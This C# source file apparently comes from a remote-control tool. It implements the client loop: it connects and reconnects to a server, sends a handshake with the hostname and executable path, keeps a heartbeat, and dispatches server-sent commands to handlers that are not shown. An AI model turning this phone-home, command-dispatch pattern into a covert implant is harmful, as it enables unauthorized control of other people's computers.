using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Microsoft.VisualBasic.Devices;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Utilities;
using System.Net;
using RemoteControl.Protocals.Response;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using RemoteControl.Client.Handlers;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    partial class Program
    {
        static void StartConnect()
        {
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(clientParameters.GetIPEndPoint());
                    DoOutput("服务器连接成功！");

                    oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);

                    // 发送Relay握手包，标识为客户端
                    var handshake = new RemoteControl.Protocals.Relay.RelayHandshake();
                    handshake.Role = "client";
                    handshake.HostName = System.Net.Dns.GetHostName();
                    handshake.AppPath = Application.ExecutablePath;
                    handshake.OnlineAvatar = clientParameters.OnlineAvatar;
                    FillHostInfo(handshake);
                    oServerSession.Send(ePacketType.CYCLER_RELAY_HANDSHAKE, handshake);

                    StartRecvData(oServerSession);
                    break;
                }
                catch (Exception ex)
                {
                    DoOutput("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static void StartRecvData(SocketSession session)
        {
            // 获取主机名，并告诉服务器
            ResponseGetHostName resp = CreateHostInfoResponse();
            session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);

            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = session.SocketObj.Receive(buffer);
                        if (recvSize <= 0)
                            break;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength));
                                data.RemoveRange(0, packetLength);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        DoOutput("接收数据异常: " + ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet)
        {
            ePacketType packetType;
            object obj;
            CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
            DoOutput("收到指令: " + packetType.ToString());

            if (handlers.ContainsKey(packetType))
            {
                handlers[packetType].Handle(session, packetType, obj);
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                if (isClosing)
                {
                    break;
                }
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = CodecFactory.Instance.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }

        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }
    }
}
